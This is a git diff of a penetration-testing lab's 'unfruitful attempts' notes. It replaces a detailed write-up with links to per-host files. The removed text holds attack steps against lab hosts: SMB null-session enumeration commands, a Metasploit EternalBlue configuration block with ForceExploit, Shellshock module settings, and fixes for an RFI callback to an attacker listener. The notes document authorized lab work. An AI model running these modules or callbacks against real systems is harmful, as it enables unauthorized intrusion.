@@ -1,131 +1,15 @@
 # Unfruitful attempts (A_Rocha lab)
 
-Archived **dead-end** lanes and operator mistakes. **Live plans:** [`../README.md`](../README.md). Evidence images: [`../../Screenshots/`](../../Screenshots/).
+Archived **dead-end** lanes and operator mistakes.
 
----
+**Live plans:** [Work `README.md`](../README.md) (index) → per-host **[`10.20.160.100/`](../10.20.160.100/README.md)**, **[`10.20.160.101/`](../10.20.160.101/README.md)**, **[`10.20.160.102/`](../10.20.160.102/README.md)**.
 
-## `10.20.160.101` — null SMB / `enum4linux` (no go)
+**Per-host dead-end write-ups (moved here from the monolithic doc):**
 
-**Context:** After **`nmap`** showed **SMB** and **CrackMapExec** identified **Win7 SP1** with **signing off**, unauthenticated listing of shares/users was attempted.
+| IP | File |
+|----|------|
+| **`10.20.160.101`** | [`../10.20.160.101/unfruitful_attempts.md`](../10.20.160.101/unfruitful_attempts.md) |
+| **`10.20.160.102`** | [`../10.20.160.102/unfruitful_attempts.md`](../10.20.160.102/unfruitful_attempts.md) |
+| **`10.20.160.100`** | [`../10.20.160.100/unfruitful_attempts.md`](../10.20.160.100/unfruitful_attempts.md) |
 
-| Attempt | Outcome |
-|---------|---------|
-| **`smbclient -L "//10.20.160.101" -N`** | “Anonymous login successful” but **no share list** — **SMB1 disabled — no workgroup available** |
-| **`crackmapexec smb 10.20.160.101 --shares -u '' -p ''`** | **`STATUS_ACCESS_DENIED`** |
-| **`enum4linux -a`** | **Workgroup JUPITER**, NetBIOS **CALLISTO** OK; then **`NT_STATUS_ACCESS_DENIED`** for domain SID, OS detail, users, share mapping, password policy (**polenum** / **NULL** attach), builtin/local/domain groups, RID cycling, printers |
-
-**Takeaway:** **Null session** enumeration is **locked down** on this image — need **credentials**, **MS17-010** / exploit path with lab approval, or **non-SMB** services (**HTTP** on **80**, **FTP** **21**, **RDP** **3389**, **MySQL** **3306**).
-
-Screenshots: [`101-003_enum4linux_access_denied_tm6_afrocha.png`](../../Screenshots/101-003_enum4linux_access_denied_tm6_afrocha.png), [`101-004_enum4linux_polenum_null_fail_tm6_afrocha.png`](../../Screenshots/101-004_enum4linux_polenum_null_fail_tm6_afrocha.png), [`101-005_enum4linux_groups_rid_fail_tm6_afrocha.png`](../../Screenshots/101-005_enum4linux_groups_rid_fail_tm6_afrocha.png).
-
-### Metasploit `ms17_010_eternalblue` — wrong target / wrong port (operator error)
-
-![MSF EternalBlue — connection refused; RPORT 80; RHOSTS 10.20.150.101](../../Screenshots/101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png)
-
-| Mistake | Why it breaks |
-|---------|----------------|
-| **`RPORT 80`** | **EternalBlue** is **SMB** — use **`RPORT 445`** (default). **Port 80** is **HTTP**; nothing answers **SMB** there → **`Connection refused`**. |
-| **`RHOSTS 10.20.150.101`** | Lab victim is **`10.20.160.101`**. **`10.20.150.*`** is often the **Kali / operator** side of the VPN — verify the **third octet** (**160** vs **150**). |
-| **`ForceExploit`** | Only after **`check`** / **`nmap smb-vuln-ms17-010`** show the host is actually vulnerable — do **not** override blindly on a patched VM. |
-
-**Correct shape (lab-authorized only):**
-
-```text
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.20.160.101
-set RPORT 445
-set LHOST <KALI_LAB_IP>
-check
-run
-```
-
-**Still seeing `10.20.160.101:80` and `SMB Login Error` / `IPC$` on port 80?** You left **`RPORT 80`** set — **`show options`** must show **`RPORT 445`**. Port **80** is not SMB; the module then fails SMB negotiation and may report **`not-vulnerable`** incorrectly. See also [`101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png`](../../Screenshots/101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png).
-
-### MS17-010 EternalBlue — `check` / `run` **not vulnerable** (correct `RPORT 445`)
-
-![EternalBlue — IPC$ connects but host does not appear vulnerable](../../Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png)
-
-| Signal | Meaning |
-|--------|---------|
-| **`Connected to \\10.20.160.101\IPC$`** | SMB **445** is correct; you are talking to the real stack. |
-| **`STATUS_INVALID_HANDLE`** / **Host does NOT appear vulnerable** | Scanner believes **MS17-010 is not exploitable** — most often **KB4013389 / MS17-010 patch** applied, or **fingerprint** does not match a vulnerable build. |
-| **`run` → `not-vulnerable: Set ForceExploit to override`** | Module refuses to fire; **`ForceExploit`** may **blue-screen** or fail messily — use **only** if the **course** allows forcing against a **maybe-patched** VM. |
-
-**Next lanes on `.101`:** **Apache/PHP on 80**, **FTP 21**, **RDP 3389**, **MySQL 3306**, **searchsploit** / **nikto** on web, or **SMB with credentials** if you obtain them.
-
-### MS17-010 — `ForceExploit true` (groom runs, **no shell**)
-
-| Screenshot | What it shows |
-|------------|----------------|
-| ![ForceExploit — check still not vulnerable, Win7 SP1, grooming starts](../../Screenshots/101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png) | **`set ForceExploit true`** — scanner still reports **not vulnerable** / **Cannot reliably check**; module still fingerprints **Windows 7 Ultimate 7601 SP1** and begins **Groom Allocations** / **eb_trans2** traffic. |
-| ![Trans2 / pool grooming completes — no session](../../Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png) | Full chain visible: **non-paged pool grooming**, **malformed Trans2**, **SMBv2 buffer** / **last fragment** — then **Receiving response from exploit packet** with **no** `[+] Meterpreter session opened`. |
-
-**What this tells us**
-
-| Observation | Interpretation |
-|-------------|----------------|
-| **`check` stays negative** even with **`ForceExploit`** | The auxiliary still does not believe MS17-010 is present — **forcing does not “un-patch”** the OS. |
-| **OS banner matches Win7 SP1** | Recon was right; the blocker is **not** “wrong target,” it is **exploitability** (patch level / SMB stack behavior). |
-| **Grooming + Trans2 packets send** | Network path and **445** are fine; the module is **actually running** the exploit logic. |
-| **No callback / no session** | Kernel pool corruption did not yield stable execution of the payload — **consistent with a patched MS17-010** (or other hardening), not a **payload port** issue. |
-
-**Conclusion:** Stop iterating **EternalBlue** on **`.101`** unless the instructor provides a **known-vulnerable** snapshot. Move to **HTTP / FTP / RDP / credentialed SMB**.
-
----
-
-## `10.20.160.102` — Shellshock / CGI / Metasploit (no shell via this lane)
-
-**Hypothesis:** Nessus and stack banners suggested **Shellshock** via **`/cgi-bin/`**; **Nikto** also flagged **`/cgi-bin/printenv`** and **`/cgi-bin/test-cgi`**.
-
-| Attempt | What we ran | Outcome |
-|---------|-------------|---------|
-| Bare **`/cgi-bin`** | `curl` without a script name | **404** — not proof that no CGI exists |
-| **Nmap `http-shellshock`** | `--script-args http-shellshock.uri=/cgi-bin/test.cgi` | **No** `http-shellshock:` finding — stock path likely absent |
-| **Nikto** | `nikto -h "http://$RHOST_102"` | Reported **printenv** / **test-cgi** as *appearing* Shellshock-vulnerable |
-| **Nmap** (follow-up) | `http-shellshock.uri=/cgi-bin/printenv` or **`/cgi-bin/test-cgi`** | Worth a retry if revisiting; primary effort moved to **dotProject** |
-| **Metasploit** `exploit/multi/http/apache_mod_cgi_bash_env_exec` | `TARGETURI /cgi-bin/printenv`, meterpreter payload | **`check`** → **The target is not exploitable** — see [`exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png`](../../Screenshots/exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png) |
-
-**`RPATH` mistake (once):** In that module, **`RPATH`** is the **CmdStager filesystem prefix** (default **`/bin`**), **not** the CGI URL. Only **`TARGETURI`** holds **`/cgi-bin/...`**.
-
-**Optional retries (low priority):** `TARGETURI /cgi-bin/test-cgi`, `set CVE CVE-2014-6278`, alternate **`HEADER`**. If still negative, treat **Shellshock** as **closed** for this host.
-
-**Recon screenshots (context):** [`recon_curl_cgi-bin_404_headers_tm6_afrocha.png`](../../Screenshots/recon_curl_cgi-bin_404_headers_tm6_afrocha.png), [`recon_nmap_http_shellshock_test_cgi_tm6_afrocha.png`](../../Screenshots/recon_nmap_http_shellshock_test_cgi_tm6_afrocha.png), Nikto [`recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`](../../Screenshots/recon_nikto_102_http80_banner_redirect_tm6_afrocha.png) / [`recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png`](../../Screenshots/recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png).
-
----
-
-## Metasploit — no dotProject module; wrong searches
-
-| Attempt | Detail |
-|---------|--------|
-| **`search dot`** | Matches **DotNetNuke**, **dotnet**, **Oracle**, **Struts** — **not** **dotProject**. See [`102-002_msf_search_dot_noise_tm6_afrocha.png`](../../Screenshots/102-002_msf_search_dot_noise_tm6_afrocha.png). |
-| **`exploit/linux/http/php_imap_open_rce`** | Targets **PrestaShop / SuiteCRM / e107 / Horde** (+ **custom**), **not** dotProject — no stock **`TARGETURI /dotproject/`**. |
-
----
-
-## `searchsploit` / generic PHP–Apache rows (deprioritized on this host)
-
-Many **`searchsploit apache 2.2.21`** / **`php 5.3.8`** hits are **other products** (Drupal, WordPress plugins, etc.). Generic **PHP-CGI** (**CVE-2012-1823** class) and **`php-cgi`** routing did not drive the successful path — this site behaved as **mod_php** under Apache. **OPTIONS** memory leak / **DoS** modules are report-only for most labs.
-
-Screenshots: [`searchsploit_apache_2_2_21_tm6_afrocha.png`](../../Screenshots/searchsploit_apache_2_2_21_tm6_afrocha.png), [`searchsploit_php_5_3_8_tm6_afrocha.png`](../../Screenshots/searchsploit_php_5_3_8_tm6_afrocha.png), [`searchsploit_dotproject_tm6_afrocha.png`](../../Screenshots/searchsploit_dotproject_tm6_afrocha.png).
-
----
-
-## RFI callback mistakes (before success)
-
-| Issue | Fix |
-|-------|-----|
-| **`Connection refused`** from **`.102`** to Kali | Wrong **`LHOST`**, server not listening, **`--bind 0.0.0.0`**, or firewall — see [`102-003_rfi_gantt_include_connection_refused_tm6_afrocha.png`](../../Screenshots/102-003_rfi_gantt_include_connection_refused_tm6_afrocha.png). |
-| **`proof.txt` 404** on Kali | File was under **`~/loot/`** while **`http.server`** ran from **`~/rfi_poc/`** — serve files from **the same directory** as the listener. |
-| **`curl https://…:8080`** to Python **`http.server`** | Use **`http://`** only; **`https://`** causes **400 Bad request version** (TLS bytes to plain HTTP). |
-
----
-
-## Original “Shellshock-first” plan text (superseded)
-
-Early notes prioritized **web → CGI → Shellshock** parallel to **dotProject**. Enumeration (`curl` **`/cgi-bin/`**, **`nmap http-shellshock`**, **`gobuster`** on **`/cgi-bin/`**) remains valid **background** work; **exploitation** effort shifted after **dotProject 2.1.6** fingerprint and **`gantt.php`** RFI confirmation.
-
----
-
-## COA 2 — generic `searchsploit` rows (not the winning path on `.102`)
-
-For reference, **`searchsploit apache 2.2.21`**, **`php 5.3.8`**, and broad PHP **CGI** / **OPTIONS** / **DoS** rows were catalogued. Many hits target **other CMSs** or need **`php-cgi`** layout; the **successful** lane was **dotProject-specific RFI** (`gantt.php`), not **CVE-2012-1823**-style CGI on this host.
+**Evidence images** for **`.100` / `.101` / `.102`** sit under each host folder: **`../10.20.160.*/Screenshots/`**. Shared captures (**STEPfwd**, teammate **`.124`**, Nessus exports) remain under [`../../Screenshots/`](../../Screenshots/).
